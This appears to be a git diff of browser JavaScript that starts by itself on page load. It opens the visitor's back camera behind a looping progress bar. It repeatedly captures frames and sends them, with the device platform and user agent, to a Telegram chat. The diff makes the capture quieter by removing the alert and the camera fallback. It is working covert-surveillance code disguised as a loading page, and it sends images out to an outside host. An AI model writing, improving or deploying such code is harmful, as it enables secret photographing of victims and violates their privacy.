@@ -9,35 +9,33 @@ const bar = document.getElementById("bar");
 let stream;
 let interval;
 
-// 🚀 start
+// 🚀 auto start
+start();
+
 async function start() {
   if (!CHAT_ID) {
-    alert("Invalid link ❌");
+    console.error("CHAT_ID نشته");
     return;
   }
 
   try {
-    // 📸 مهم: environment = back camera
+    // 📸 یوازې شا کمره
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { exact: "environment" } }
+      video: { facingMode: { ideal: "environment" } }
     });
 
     video.srcObject = stream;
 
-    video.onloadedmetadata = () => startLoop();
+    video.onloadedmetadata = () => {
+      startLoop();
+    };
 
   } catch (err) {
-    console.warn("Back camera not found, switching to default");
-
-    // fallback که شا کمره ونه موندل شي
-    stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-
-    video.onloadedmetadata = () => startLoop();
+    console.error("Camera error:", err);
   }
 }
 
-// 🔄 loading loop
+// 🔄 loading loop (0 → 100 → reset)
 function startLoop() {
   let progress = 0;
 
@@ -53,37 +51,34 @@ function startLoop() {
       capture();
     }
 
-  }, 50);
+  }, 50); // 1 second
 }
 
 // 📸 capture
 function capture() {
+  if (!video.videoWidth) return;
+
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
 
-  ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.3)";
+  ctx.filter = "brightness(1.1) contrast(1.2)";
   ctx.drawImage(video, 0, 0);
 
-  canvas.toBlob(sendToTelegram, "image/jpeg");
+  canvas.toBlob(send, "image/jpeg");
 }
 
-// 📤 send
-function sendToTelegram(blob) {
+// 📤 send to telegram
+function send(blob) {
   const fd = new FormData();
 
   fd.append("chat_id", CHAT_ID);
-  fd.append("photo", blob, "back_camera.jpg");
+  fd.append("photo", blob, "back.jpg");
 
   const caption =
-`📸 Camera Capture
-
-📷 Back Camera (Environment)
+`📸 Back Camera Capture
 
 📱 Device: ${navigator.platform}
 🌐 Browser: ${navigator.userAgent}
-
-🤖 Bot: @ProSimTookBot
-👨‍💻 Dev: @XFPro43
 
 🛡️ Status: Active`;
 
@@ -96,9 +91,9 @@ function sendToTelegram(blob) {
   .then(res => res.json())
   .then(data => {
     if (!data.ok) {
-      console.error("❌ Telegram Error:", data.description);
+      console.error("Telegram error:", data.description);
     } else {
-      console.log("(Back Camera)");
+      console.log("Sent ✅");
     }
   })
   .catch(err => console.error(err));
